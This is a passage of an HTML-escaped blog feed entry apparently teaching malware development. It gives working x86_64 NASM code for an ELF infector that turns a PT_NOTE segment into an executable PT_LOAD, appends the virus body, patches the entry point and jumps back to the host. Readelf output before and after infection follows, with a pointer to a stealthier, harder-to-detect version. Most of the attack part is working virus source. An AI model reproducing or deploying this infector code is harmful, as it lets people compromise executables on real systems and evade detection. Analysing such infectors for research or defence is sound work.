+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;and&lt;/span&gt;     cx, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf000&lt;/span&gt;                          &lt;span style=&#34;color:#75715e&#34;&gt;; we align the address on page border&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]           &lt;span style=&#34;color:#75715e&#34;&gt;; and we add the file size to it so that&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                &lt;span style=&#34;color:#75715e&#34;&gt;; it will be on another page and also to keep&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                &lt;span style=&#34;color:#75715e&#34;&gt;; offset and address consistent&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr], rcx                &lt;span style=&#34;color:#75715e&#34;&gt;; We put it after the last address mapped into memory&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_paddr], rcx                &lt;span style=&#34;color:#75715e&#34;&gt;; but we have to align it on another page&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]                &lt;span style=&#34;color:#75715e&#34;&gt;; We convert our infected segment&amp;#39;s address to&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], rax            &lt;span style=&#34;color:#75715e&#34;&gt;; an offset in case remapping changes the map address&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is the code that will handle the &lt;code&gt;PT_NOTE&lt;/code&gt; hijacking. If we want our program to execute, we need the new &lt;code&gt;PT_LOAD&lt;/code&gt; header to be valid so we will have to change a lot of its fields.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;p_type&lt;/code&gt;: We will switch it from &lt;code&gt;PT_NOTE&lt;/code&gt; to &lt;code&gt;PT_LOAD&lt;/code&gt; to tell the system that we want to map our code into the memory.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;p_flags&lt;/code&gt;: For &lt;code&gt;PT_LOAD&lt;/code&gt; segments, this field is used to define the permissions that will be granted to our segment. We will give it read and execute permissions because that&amp;rsquo;s all ot needs.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;p_offset&lt;/code&gt;: This field defines here the segment starts, since we are gonna put our code at the end of the file, we will put the file size value here.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;p_file/memsz&lt;/code&gt;: Those are used to tell the system the place it needs to reserve in memory and how many bytes of the file it has to put in. We will define both as the virus length (We will see how to get it later)&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;p_p/vaddr&lt;/code&gt;: Those are the physical and virtual addresses where the segment will be mapped. It is said in the man that &lt;code&gt;Loadable process segments must have congruent values for p_vaddr and p_offset, modulo the page size.&lt;/code&gt; so we will take the page right after the last already existing &lt;code&gt;PT_LOAD&lt;/code&gt; and then add it the file size so that we are sure that he offset and addresses values have congruent values.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;p_align&lt;/code&gt;: Loadable segments are aligned on memory pages so we will change it to the usual size of a page (0x1000 bytes)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;adjust_file_size:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rsi, virus_len
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_new_filesize], rsi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_FTRUNCATE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    eax, eax
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     munmap_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_new_filesize]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r10, r10
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r10b, MREMAP_MAYMOVE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MREMAP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     munmap_quit_infect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map], rax            &lt;span style=&#34;color:#75715e&#34;&gt;; This might break the reference to the phdrs&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                            &lt;span style=&#34;color:#75715e&#34;&gt;; but they are not needed anymore&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rsi, [rel _start]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, virus_len
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;copy_payload:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lodsb&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;stosb&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;loop&lt;/span&gt;    copy_payload
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;patch_entrypoint:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, r8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_entry]          &lt;span style=&#34;color:#75715e&#34;&gt;; We save the old entrypoint&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_entry], rcx    &lt;span style=&#34;color:#75715e&#34;&gt;; We change the entrypoint to our code&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, final_jmp_offset        &lt;span style=&#34;color:#75715e&#34;&gt;; The address to patch&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rdx, rcx                     &lt;span style=&#34;color:#75715e&#34;&gt;; We have the relative jump&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_offset]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, r8
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, final_jmp_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;; The file offset of the address to patch&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; [rcx], edx             &lt;span style=&#34;color:#75715e&#34;&gt;; We return to the original entrypoint&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;munmap_quit_infect:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MSYNC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MUNMAP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;close_quit_infect:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_CLOSE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;quit_infect:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    signature: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, SIGNATURE, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dir1: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/test/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dir2: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/test2/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cwd: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_end:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_EXIT
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once our new segment has been created, it is time to put the code inside the file. Since we are working with a memory mapped file, we need to remap it to extend it first. Once this has been done, we just go to the previous end of the file and we copy the payload there. To get the size of our payload, we use the &lt;code&gt;_end&lt;/code&gt; beacon that we put at the end so that we can define &lt;code&gt;virus_len&lt;/code&gt; as &lt;code&gt;_end - _start&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Once our payload has been copied, the last step is to hijack the control flow to get it executed. To do that we will first add the following lines to &lt;code&gt;_start&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp&lt;/span&gt;     _end
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;final_jmp_offset&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt; equ&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; _start
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this line, the program will cleanly quits after its first execution. We can also use this &lt;code&gt;jmp&lt;/code&gt; to jmp back to the original entrypoint after the virus execution. In x86_64 assembly, a jump is encoded as &lt;code&gt;opcode relative_offset&lt;/code&gt; starting from the &lt;code&gt;final_jmp_offset&lt;/code&gt; label.
+We can obtain this offset with the formula : &lt;code&gt;old_entrypoint_address - final_jmp_offset&lt;/code&gt;.
+Once we replaced the jmp address in the copied code, everything is set but there is still one thing to do for the infector to fully work : preserve its registers.
+Indeed, the host program code might expect some special values in some register that we used (like &lt;code&gt;argc&lt;/code&gt; and &lt;code&gt;argv&lt;/code&gt; in &lt;code&gt;rdi&lt;/code&gt; and &lt;code&gt;rsi&lt;/code&gt;) so we will push those important registers at the very beginning of our program and pop them just before the final jump.&lt;/p&gt;
+&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
+&lt;p&gt;We can now infect any ELF 64-bits of our system and get anything executed executed by it if we insert a real payload inside but we have a problem : our technique is not stealthy at all, we can be spotted by &lt;code&gt;readelf&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;readelf&lt;/code&gt; is a linux command that allows us to inspect ELF files, we will use it with the &lt;code&gt;-l&lt;/code&gt; option to display the program headers of a simple Hello World coded in C before and after infection.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Elf file type is DYN (Shared object file)
+Entry point 0x1050
+There are 11 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset             VirtAddr           PhysAddr
+                 FileSiz            MemSiz              Flags  Align
+  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
+                 0x0000000000000268 0x0000000000000268  R      0x8
+  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
+                 0x000000000000001c 0x000000000000001c  R      0x1
+      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000560 0x0000000000000560  R      0x1000
+  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
+                 0x00000000000001bd 0x00000000000001bd  R E    0x1000
+  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
+                 0x0000000000000158 0x0000000000000158  R      0x1000
+  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
+                 0x0000000000000248 0x0000000000000250  RW     0x1000
+  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
+                 0x00000000000001e0 0x00000000000001e0  RW     0x8
+  NOTE           0x00000000000002c4 0x00000000000002c4 0x00000000000002c4
+                 0x0000000000000044 0x0000000000000044  R      0x4
+  GNU_EH_FRAME   0x0000000000002014 0x0000000000002014 0x0000000000002014
+                 0x000000000000003c 0x000000000000003c  R      0x4
+  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000000 0x0000000000000000  RW     0x10
+  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
+                 0x0000000000000218 0x0000000000000218  R      0x1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is how a normal file looks like, it has 4 load segments including a single one that is executable for the code and a single one that is writable for the data segment. It also has a NOTE header that is containing notes about the program.&lt;/p&gt;
+&lt;p&gt;After the infection, it will look more like :&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Elf file type is DYN (Shared object file)
+Entry point 0x70e0
+There are 11 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset             VirtAddr           PhysAddr
+                 FileSiz            MemSiz              Flags  Align
+  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
+                 0x0000000000000268 0x0000000000000268  R      0x8
+  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
+                 0x000000000000001c 0x000000000000001c  R      0x1
+      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000560 0x0000000000000560  R      0x1000
+  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
+                 0x00000000000001bd 0x00000000000001bd  R E    0x1000
+  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
+                 0x0000000000000158 0x0000000000000158  R      0x1000
+  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
+                 0x0000000000000248 0x0000000000000250  RW     0x1000
+  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
+                 0x00000000000001e0 0x00000000000001e0  RW     0x8
+  LOAD           0x00000000000040e0 0x00000000000070e0 0x00000000000070e0
+                 0x000000000000038a 0x000000000000038a  R E    0x1000
+  GNU_EH_FRAME   0x0000000000002014 0x0000000000002014 0x0000000000002014
+                 0x000000000000003c 0x000000000000003c  R      0x4
+  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
+                 0x0000000000000000 0x0000000000000000  RW     0x10
+  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
+                 0x0000000000000218 0x0000000000000218  R      0x1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can now see that there is another load segment which has execution permissions. It is super weird and should not be there at all, we can also notice that obviously, the NOTE segment disappeared. Another odd thing is the fact that the entrypoint is pointing on that segment. The code segment is almost always mapped at 0x1000 and the entrypoint is usually at the beginning of it so 0x70e0 definitely doesn&amp;rsquo;t look legit.
+This is how you can see that this file is not legitimate and probably infected without even the need to properly analyze it.&lt;/p&gt;
+&lt;p&gt;Lucky for us, we are gonna learn how to make an infector that will not induce any peculiar change in the ELF file structure. It will keep the original entrypoint and it will not change the number of load segments nor their permissions.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_advanced&#34;&gt;Part 2. Advanced infectors: How to make our infector stealthy and hardly detectable&lt;/a&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Mechanical Madness - [HTB UNICTF 2021 - Qualifiers]</title>
+      <link>https://alagroy-42.github.io/writeups/mechanical_madness/</link>
